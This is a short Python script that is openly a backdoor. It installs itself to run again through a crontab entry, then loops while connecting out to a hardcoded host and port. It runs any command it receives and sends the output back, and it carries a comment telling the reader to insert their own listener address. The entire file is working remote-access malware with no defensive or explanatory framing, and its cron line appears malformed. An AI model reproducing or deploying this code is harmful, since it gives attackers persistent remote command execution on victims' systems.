import socket
import subprocess
import os
import time
import getpass

def install_persistence():
    cron_job = f"* **** {getpass.getuser()} python3 {__file__}\n"
    with open("/tmp/cronjob","w") as f:
        f.write(cron_job)
    subprocess.run("crontab /tmp/cronjob", shell=True)
    os.remove("/tmp/cronjob")
    print("[*] Persistence installed via crontab")

def backdoor(lhost, lport):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((lhost, lport))
            while True:
                cmd = s.recv(1024).decode()
                if cmd.lower() =="exit":
                    break
                output = subprocess.getoutput(cmd)
                s.send(output.encode())
            s.close()
        except:
            time.sleep(5)  # Retry every 5 seconds

if __name__ == "__main__":
    install_persistence()
    backdoor("192.168.137.90", 4343)  # Replace with your LHOST and LPORT
